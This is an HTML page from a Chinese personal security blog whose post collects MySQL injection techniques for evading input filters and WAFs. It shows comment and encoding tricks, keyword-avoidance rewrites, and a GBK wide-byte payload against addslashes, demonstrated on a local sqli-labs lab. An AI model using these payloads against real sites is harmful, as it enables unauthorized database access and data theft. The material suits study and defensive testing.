@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="This_is_Y">
+    
+    <title>
+        
+            mysql绕过技巧 |
+        
+        This_is_Y
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/title.jpg">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/regular.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/solid.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.1.3/font/css/brands.min.css">
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"this-is-y.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#33CCCC","title":"This_is_Y","author":"This_is_Y","avatar":"/images/head.png","logo":"/images/title1.jpg","favicon":"/images/title.jpg","url":"https://github.com/This-is-Y/"},"menu":{"home":"/","archives":"/archives","Archives":"/archives","cnblogs":"/categories/cnblogs","Game":"/Game","shell":"/Reverseshell"},"first_screen":{"enable":false,"background_img":"/images/Watch.png","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":false,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz","appkey":"itjAi31G55tfhpSKJiuLDe2g","meta":["nick","mail","link"],"placeholder":"生命是上天的馈赠，我不想虚度年华"},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":true},"footer":{"since":2021,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.3"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/title1.jpg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               This_is_Y
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories/cnblogs"
+                            >
+                                
+                                CNBLOGS
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/game"
+                            >
+                                
+                                GAME
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/reverseshell"
+                            >
+                                
+                                SHELL
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories/cnblogs"
+                    >CNBLOGS</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/game"
+                    >GAME</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/reverseshell"
+                    >SHELL</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        mysql绕过技巧
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/head.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">This_is_Y</span>
+                                
+                                    <span class="author-badge">Lv6</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2021-07-30 16:08:04</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sun Aug 01 2021 16:13:47 GMT+0800">2021-08-01 16:13:47</span>
+            </span>
+        
+
+        
+
+        
+
+        
+        
+            <span class="meta-info-item post-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>962 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>4 分钟</span>
+            </span>
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    <p>参考：<a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/yesec/p/12344786.html">https://www.cnblogs.com/yesec/p/12344786.html<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="针对特殊字符限制的绕过"><a href="#针对特殊字符限制的绕过" class="headerlink" title="针对特殊字符限制的绕过"></a>针对特殊字符限制的绕过</h2><h3 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h3><h4 id><a href="#" class="headerlink" title="/**/"></a>/**/</h4><p>SELECT * from emails where id=1<br>SELECT/<strong>/*/</strong>/from/<strong>/emails/</strong>/where/**/id=1</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="()"></a>()</h4><p>括号也可以绕，但不是所有的地方都可以用，<br>select * from emails where(1=1)and(2=2);    √<br>select(*)from()emails()where(1=1)and(2=2);   ×<br>不是很会用</p>
+<p>用Tab代替空格%20 %09 %0a %0b %0c %0d %a0 /**/()</p>
+<h3 id="逗号-，"><a href="#逗号-，" class="headerlink" title="逗号  ，"></a>逗号  ，</h3><h4 id="使用语法绕过："><a href="#使用语法绕过：" class="headerlink" title="使用语法绕过："></a>使用语法绕过：</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ((<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>)c);</span><br><span class="line">实际上也就相当于：</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br></pre></td></tr></table></figure>
+
+<h4 id="substr-mid"><a href="#substr-mid" class="headerlink" title="substr/mid"></a>substr/mid</h4><p>绕过方法: from x for y</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">substr(<span class="string">&#x27;password&#x27;</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line"><span class="operator">=</span>substr(<span class="string">&#x27;password&#x27;</span> <span class="keyword">from</span> <span class="number">5</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">mid(<span class="string">&#x27;password&#x27;</span>, <span class="number">5</span>, <span class="number">1</span>)</span><br><span class="line"><span class="operator">=</span>mid(<span class="string">&#x27;password&#x27;</span> <span class="keyword">from</span> <span class="number">5</span> <span class="keyword">for</span> <span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="比较符-lt-gt"><a href="#比较符-lt-gt" class="headerlink" title="比较符 &lt; &gt;"></a>比较符 &lt; &gt;</h3><h4 id="greatest函数绕过"><a href="#greatest函数绕过" class="headerlink" title="greatest函数绕过"></a>greatest函数绕过</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">greatest(a,b)，返回a和b中较大的那个数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>猜解user()第一个字符的ascii码是否小于等于150时<br>ascii(mid(user(),1,1)) &lt;= 150<br>=greatest(ascii(mid(user(),1,1)), 150)=150;</p>
+<h4 id="-2"><a href="#-2" class="headerlink" title="=, !="></a>=, !=</h4><p>枚举爆破绕过</p>
+<h3 id="等号"><a href="#等号" class="headerlink" title="等号   ="></a>等号   =</h3><pre><code>SELECT mid(USER(),1,1) = &quot;r&quot;
+SELECT mid(USER(),1,1) like &quot;r&quot;
+SELECT mid(USER(),1,1) in (&quot;r&quot;)
+</code></pre>
+<h3 id="单引号-‘"><a href="#单引号-‘" class="headerlink" title="单引号  ‘"></a>单引号  ‘</h3><p>在比较的时候过滤了’<br>用hex编码绕过<br>    防护：SELECT mid(USER(),1,1)=’r’<br>    绕过：SELECT mid(USER(),1,1)=unhex(72)</p>
+<p>这样子这个只能hex一个字符，多了就不行，所以不建议用这个<br>直接0x就行了<br>    防护：SELECT mid(USER(),1,4)=”root”<br>    绕过：SELECT mid(USER(),1,4)=0x726f6f74</p>
+<h3 id="括号-（-）"><a href="#括号-（-）" class="headerlink" title="括号 （  ）"></a>括号 （  ）</h3><h4 id="左括号过滤"><a href="#左括号过滤" class="headerlink" title="左括号过滤"></a>左括号过滤</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">28</span> <span class="operator">%</span>c0<span class="operator">%</span>a8</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a8</span><br></pre></td></tr></table></figure>
+
+<h4 id="右括号过滤"><a href="#右括号过滤" class="headerlink" title="右括号过滤"></a>右括号过滤</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlencode，ascii(<span class="type">char</span>)，hex，unicode编码绕过</span><br><span class="line"><span class="operator">%</span>u0029 <span class="operator">%</span>uff09</span><br><span class="line"><span class="operator">%</span>c0<span class="operator">%</span><span class="number">29</span> <span class="operator">%</span>c0<span class="operator">%</span>a9</span><br><span class="line"><span class="operator">%</span>e0<span class="operator">%</span><span class="number">80</span><span class="operator">%</span>a9</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="针对关键字限制的绕过"><a href="#针对关键字限制的绕过" class="headerlink" title="针对关键字限制的绕过"></a>针对关键字限制的绕过</h2><h3 id="or-and"><a href="#or-and" class="headerlink" title="or and"></a>or and</h3><p>对于or 和 and，可以用 || 和  &amp;&amp;</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="operator">||</span> <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> <span class="number">1</span> <span class="operator">&amp;&amp;</span> a <span class="operator">=</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><p>逻辑绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>))</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> lpad(<span class="keyword">user</span>(),<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">in</span> <span class="string">&#x27;r&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h3 id="hex"><a href="#hex" class="headerlink" title="hex"></a>hex</h3><p>逻辑绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤代码 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> unhex(<span class="number">61</span>)</span><br><span class="line">绕过方式 <span class="number">1</span> <span class="operator">&amp;&amp;</span> substr(<span class="keyword">user</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="built_in">lower</span>(conv(<span class="number">11</span>,<span class="number">10</span>,<span class="number">16</span>)) #十进制的<span class="number">11</span>转化为十六进制，并小写。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="union-select"><a href="#union-select" class="headerlink" title="union\select"></a>union\select</h3><p>逻辑绕过<br>例：<br>过滤代码 union select user,password from users<br>绕过方式 1 &amp;&amp; (select user from users where userid=1)=’admin’</p>
+<p>十六进制字符绕过<br>select ——&gt; selec\x74<br>union——&gt;unio\x6e</p>
+<h3 id="where"><a href="#where" class="headerlink" title="where"></a>where</h3><p>逻辑绕过<br>过滤代码 1 &amp;&amp; (select user from users where user_id = 1) = ‘admin’<br>绕过方式 1 &amp;&amp; (select user from users limit 1) = ‘admin’</p>
+<h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>逻辑绕过<br>过滤代码 1 &amp;&amp; (select user from users limit 1) = ‘admin’<br>绕过方式 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’#user_id聚合中user_id为1的user为admin</p>
+<h3 id="group-by"><a href="#group-by" class="headerlink" title="group by"></a>group by</h3><p>逻辑绕过<br>过滤代码 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = ‘admin’<br>绕过方式 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1</p>
+<h2 id="绕过addslashes"><a href="#绕过addslashes" class="headerlink" title="绕过addslashes"></a>绕过addslashes</h2><p>addslashes函数使用反斜线引用字符串，返回一个字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）<br>在mysql使用了gbk编码的情况下，可以用宽字节注入绕过addslashes<br>原理：在使用GBK编码后，他认为两个字节代表一个汉字。那如何判断一个字符是不是中文，当第一个字节ascii码大于128，他就会认为这里两个字符是中文，所以%81和后面的  /（%5c)就会组合在一起，mysql会认为他们是一个字符，而这时候，/ 的转义作用就失效了。<br>128转换16进制是0x80，所以只要大于0x81就行</p>
+<p>这里出问题的地方在于mysql，php已经尽职尽责了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-33&#x2F;?id&#x3D;-1&#39;union select 1,user(),3--+</span><br><span class="line">127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-33&#x2F;?id&#x3D;-1**%81**&#39;union select 1,user(),3--+</span><br><span class="line">SELECT * FROM users WHERE id&#x3D;&#39;-1�\&#39;union select 1,user(),3</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="关键字内联绕所有"><a href="#关键字内联绕所有" class="headerlink" title="关键字内联绕所有"></a>关键字内联绕所有</h2><p>/<em>!union</em>/<br>/<em>!select</em>/</p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2021/07/31/PCvx%E5%9B%BE%E7%89%87%E8%A7%A3%E5%AF%86/"
+                                   title="PCvx图片解密"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">PCvx图片解密</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2021/07/28/C2%E9%9A%90%E8%97%8F/"
+                                   title="C2隐藏"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">C2隐藏</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="valine-container">
+        <div id="vcomments"></div>
+        <script data-pjax
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script data-pjax
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'pnLUL03RCIjbXBNX6m4sBrtq-gzGzoHsz',
+              appKey: 'itjAi31G55tfhpSKJiuLDe2g',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '生命是上天的馈赠，我不想虚度年华',
+              lang: 'zh-CN'.toLowerCase()
+            }
+
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
+            } else {
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
+            }
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <!-- use hexo-blog-encrypt -->
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">针对特殊字符限制的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A9%BA%E6%A0%BC"><span class="nav-text">空格</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-text">&#x2F;**&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#-1"><span class="nav-text">()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%97%E5%8F%B7-%EF%BC%8C"><span class="nav-text">逗号  ，</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E8%AF%AD%E6%B3%95%E7%BB%95%E8%BF%87%EF%BC%9A"><span class="nav-text">使用语法绕过：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#substr-mid"><span class="nav-text">substr&#x2F;mid</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E8%BE%83%E7%AC%A6-lt-gt"><span class="nav-text">比较符 &lt; &gt;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#greatest%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="nav-text">greatest函数绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#-2"><span class="nav-text">&#x3D;, !&#x3D;</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%89%E5%8F%B7"><span class="nav-text">等号   &#x3D;</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7-%E2%80%98"><span class="nav-text">单引号  ‘</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%AC%E5%8F%B7-%EF%BC%88-%EF%BC%89"><span class="nav-text">括号 （  ）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B7%A6%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-text">左括号过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%B3%E6%8B%AC%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="nav-text">右括号过滤</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%92%88%E5%AF%B9%E5%85%B3%E9%94%AE%E5%AD%97%E9%99%90%E5%88%B6%E7%9A%84%E7%BB%95%E8%BF%87"><span class="nav-text">针对关键字限制的绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#or-and"><span class="nav-text">or and</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#substr"><span class="nav-text">substr</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hex"><span class="nav-text">hex</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union-select"><span class="nav-text">union\select</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#where"><span class="nav-text">where</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#limit"><span class="nav-text">limit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group-by"><span class="nav-text">group by</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87addslashes"><span class="nav-text">绕过addslashes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E5%86%85%E8%81%94%E7%BB%95%E6%89%80%E6%9C%89"><span class="nav-text">关键字内联绕所有</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2021</span>&nbsp;-&nbsp;2025
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">This_is_Y</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
